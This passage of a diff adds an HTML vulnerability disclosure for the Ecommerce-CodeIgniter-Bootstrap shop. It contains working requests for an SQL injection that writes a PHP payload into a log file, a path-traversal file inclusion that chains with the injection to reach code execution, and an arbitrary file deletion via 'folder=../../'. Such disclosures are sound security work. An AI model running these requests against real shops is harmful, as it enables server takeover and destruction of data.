class="hljs-number">22</span>image%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A0%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>time%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A10%<span class="hljs-number">3</span>A%<span class="hljs-number">221704214090</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A11%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>time_update%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">220</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A10%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>visibility%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">221</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A14%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>shop_categorie%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">221</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A8%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>quantity%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A5%<span class="hljs-number">3</span>A%<span class="hljs-number">2210000</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A11%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>procurement%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">220</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A9%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>in_slider%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">220</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>url%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A6%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>test_2%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A16%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>virtual_products%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BN%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A8%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>brand_id%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BN%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A8%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>position%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22123</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A5%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>price%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22100</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A16%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>product_quantity%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A18%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>C%<span class="hljs-number">3</span>Fphp+phpinfo()%<span class="hljs-number">3</span>B%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>E%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D&amp;userEmail=test%<span class="hljs-number">40</span>test.com
+</span></div></code></pre>
+<p>In <code>application/logs/log-xxxx.php</code>, error message of SQL query will appear, which illustrates the presence of SQL injection.</p>
+<pre class="hljs"><code><div><span class="hljs-meta">&lt;?php</span> defined(<span class="hljs-string">'BASEPATH'</span>) <span class="hljs-keyword">OR</span> <span class="hljs-keyword">exit</span>(<span class="hljs-string">'No direct script access allowed'</span>); <span class="hljs-meta">?&gt;</span>
+......
+ERROR - <span class="hljs-number">2024</span><span class="hljs-number">-01</span><span class="hljs-number">-03</span> <span class="hljs-number">01</span>:<span class="hljs-number">24</span>:<span class="hljs-number">45</span> --&gt; Query error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version <span class="hljs-keyword">for</span> the right syntax to <span class="hljs-keyword">use</span> <span class="hljs-title">near</span> '&lt;?<span class="hljs-title">php</span> <span class="hljs-title">phpinfo</span>();<span class="hljs-meta">?&gt;</span> WHERE id = <span class="hljs-number">2</span><span class="hljs-string">' at line 1 - Invalid query: UPDATE products SET quantity=quantity-&lt;?php phpinfo();?&gt; WHERE id = 2
+</span></div></code></pre>
+<h2 id="file-inclusion">File Inclusion</h2>
+<p>This vulnerability is in <code>getLangFolderForEdit</code> method of <code>application/modules/admin/controllers/advanced_settings/Languages.php</code>. By controlling <code>$_GET['editLang']</code>, the attacker can make the server include <code>.php</code> files under specific directory. The attacker can use previous SQL injection vulnerability to write malicous PHP code in <code>log-xxxx.php</code> and use this vulnerability to include PHP files under <code>application/logs/</code> (At this point, <code>BASEPATH</code> has been set, allowing bypass of the check at the beginning of the log file.), which leads to remote code execution.</p>
+<pre class="hljs"><code><div><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getLangFolderForEdit</span><span class="hljs-params">()</span>
+    </span>{
+        $langFiles = <span class="hljs-keyword">array</span>();
+        $files = rreadDir(<span class="hljs-string">'application'</span> . DIRECTORY_SEPARATOR . <span class="hljs-string">'language'</span> . DIRECTORY_SEPARATOR . <span class="hljs-string">''</span> . $_GET[<span class="hljs-string">'editLang'</span>] . DIRECTORY_SEPARATOR);
+        $arrPhpFiles = $arrJsFiles = <span class="hljs-keyword">array</span>();
+        <span class="hljs-keyword">foreach</span> ($files <span class="hljs-keyword">as</span> $ext =&gt; $filesLang) {
+            <span class="hljs-keyword">foreach</span> ($filesLang <span class="hljs-keyword">as</span> $fileLang) {
+                <span class="hljs-keyword">if</span> ($ext == <span class="hljs-string">'php'</span>) {
+                    <span class="hljs-keyword">require</span> $fileLang;
+                    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($lang)) {
+                        $arrPhpFiles[$fileLang] = $lang;
+                        <span class="hljs-keyword">unset</span>($lang);
+                    }
+                }
+                <span class="hljs-keyword">if</span> ($ext == <span class="hljs-string">'js'</span>) {
+                    $jsTrans = file_get_contents($fileLang);
+                    preg_match_all(<span class="hljs-string">'/(.+?)"(.+?)"/'</span>, $jsTrans, $PMA);
+                    $arrJsFiles[$fileLang] = $PMA;
+                    <span class="hljs-keyword">unset</span>($PMA);
+                }
+            }
+        }
+        $langFiles[<span class="hljs-number">0</span>] = $arrPhpFiles;
+        $langFiles[<span class="hljs-number">1</span>] = $arrJsFiles;
+        <span class="hljs-keyword">return</span> $langFiles;
+    }
+</div></code></pre>
+<pre class="hljs"><code><div><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'editLang'</span>])) {
+            $num = <span class="hljs-keyword">$this</span>-&gt;Languages_model-&gt;countLangs($_GET[<span class="hljs-string">'editLang'</span>]);
+            <span class="hljs-keyword">if</span> ($num == <span class="hljs-number">0</span>) {
+                redirect(<span class="hljs-string">'admin/languages'</span>);
+            }
+            $langFiles = <span class="hljs-keyword">$this</span>-&gt;getLangFolderForEdit();
+        }
+</div></code></pre>
+<pre class="hljs"><code><div><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">countLangs</span><span class="hljs-params">($name = null, $abbr = null)</span>
+    </span>{
+        <span class="hljs-keyword">if</span> ($name != <span class="hljs-keyword">null</span>) {
+            <span class="hljs-keyword">$this</span>-&gt;db-&gt;where(<span class="hljs-string">'name'</span>, $name);
+        }
+        <span class="hljs-keyword">if</span> ($abbr != <span class="hljs-keyword">null</span>) {
+            <span class="hljs-keyword">$this</span>-&gt;db-&gt;or_where(<span class="hljs-string">'abbr'</span>, $abbr);
+        }
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;db-&gt;count_all_results(<span class="hljs-string">'languages'</span>);
+    }
+</div></code></pre>
+<p>The steps to reproduce are as follows:</p>
+<ul>
+<li>
+<p>Add a new language called <code>../logs</code> to bypass <code>$num = $this-&gt;Languages_model-&gt;countLangs($_GET['editLang']);</code>.
+<img src="../images/Pasted image 20240103001216.png" alt=""></p>
+</li>
+<li>
+<p>Use previous SQL injection vulnerability to write malicous PHP code into log file. This step needs to be done after the first step because adding language will clear log file.</p>
+</li>
+<li>
+<p>Edit language <code>../logs</code></p>
+</li>
+</ul>
+<pre class="hljs"><code><div><span class="hljs-keyword">GET</span> <span class="hljs-string">/Ecommerce-CodeIgniter-Bootstrap/admin/languages/?editLang=../logs</span> HTTP/1.1
+<span class="hljs-attribute">Host</span>: localhost
+<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate
+<span class="hljs-attribute">Connection</span>: close
+<span class="hljs-attribute">Referer</span>: http://localhost/Ecommerce-CodeIgniter-Bootstrap/admin/languages
+<span class="hljs-attribute">Cookie</span>: ci_session=inm96ingrq5a7murjrsmvjc7o7ke83jg; shopping_cart=a%3A1%3A%7Bi%3A0%3Bi%3A2%3B%7D
+<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1
+<span class="hljs-attribute">Sec-Fetch-Dest</span>: document
+<span class="hljs-attribute">Sec-Fetch-Mode</span>: navigate
+<span class="hljs-attribute">Sec-Fetch-Site</span>: same-origin
+<span class="hljs-attribute">Sec-Fetch-User</span>: ?1
+</div></code></pre>
+<p><img src="../images/Pasted image 20240103001232.png" alt=""></p>
+<h1 id="arbitrary-file-deletion">Arbitrary File Deletion</h1>
+<p>An arbitrary file deletion (CWE-73) vulnerability is in <code>application/modules/admin/controllers/ecommerce/Publish.php</code>. In the method <code>removeSecondaryImage</code>, the attacker can delete any file in the server by controlling <code>$_POST['folder']</code> and <code>$_POST['image']</code> after authorization.</p>
+<pre class="hljs"><code><div><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">removeSecondaryImage</span><span class="hljs-params">()</span>
+    </span>{
+        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;input-&gt;is_ajax_request()) {
+            $img = <span class="hljs-string">'.'</span> . DIRECTORY_SEPARATOR . <span class="hljs-string">'attachments'</span> . DIRECTORY_SEPARATOR . <span class="hljs-string">'shop_images'</span> . DIRECTORY_SEPARATOR . <span class="hljs-string">''</span> . $_POST[<span class="hljs-string">'folder'</span>] . DIRECTORY_SEPARATOR . $_POST[<span class="hljs-string">'image'</span>];
+            unlink($img);
+        }
+    }
+</div></code></pre>
+<pre class="hljs"><code><div><span class="hljs-keyword">POST</span> <span class="hljs-string">/Ecommerce-CodeIgniter-Bootstrap/admin/removeSecondaryImage</span> HTTP/1.1
+<span class="hljs-attribute">Host</span>: localhost
+<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+<span class="hljs-attribute">Accept</span>: */*
+<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate
+<span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded; charset=UTF-8
+<span class="hljs-attribute">X-Requested-With</span>: XMLHttpRequest
+<span class="hljs-attribute">Content-Length</span>: 31
+<span class="hljs-attribute">Origin</span>: http://localhost
+<span class="hljs-attribute">Connection</span>: close
+<span class="hljs-attribute">Referer</span>: http://localhost/Ecommerce-CodeIgniter-Bootstrap/admin/publish
+<span class="hljs-attribute">Cookie</span>: ci_session=8qfeq95l0u1nfjpj6clgr5p976m7igkh; shopping_cart=a%3A1%3A%7Bi%3A0%3Bi%3A2%3B%7D
+<span class="hljs-attribute">Sec-Fetch-Dest</span>: empty
+<span class="hljs-attribute">Sec-Fetch-Mode</span>: cors
+<span class="hljs-attribute">Sec-Fetch-Site</span>: same-origin
+
+<span class="ini"><span class="hljs-attr">image</span>=README.md&amp;folder=../../
+</span></div></code></pre>
+
+</body>
+</html>
